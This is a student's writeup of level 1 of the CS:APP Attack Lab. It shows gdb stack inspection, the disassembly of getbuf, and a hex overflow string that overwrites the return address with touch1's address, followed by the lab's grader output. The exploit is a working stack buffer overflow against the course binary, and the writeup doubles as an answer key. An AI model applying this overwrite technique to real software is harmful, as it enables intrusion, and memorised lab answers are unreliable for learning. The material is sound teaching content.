# CS:APP Attacklab Writeup
## Level 1
Run the program with argument `-q` to prevent it from connecting to the server.

Break at the entry of `test`, and `x/w $rsp`.

```
(gdb) x/w $rsp
0x5561dca0:	0x00401976
```
We can see the address of the top of the stack, and the return location (0x00401976).

Continue to read the code of `getbuf`:
```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
After changing the position of %rsp:
```
(gdb) x/w $rsp
0x5561dc78:	0
```
We just need to create a string that overlapped the original return address to `touch1`:
at address `4017c0`.

Therefore, we can devise the following attack string (in hex):
```
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 11 11 11
C0 17 40
```
```
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 11 11 11 C0 17 40 
```
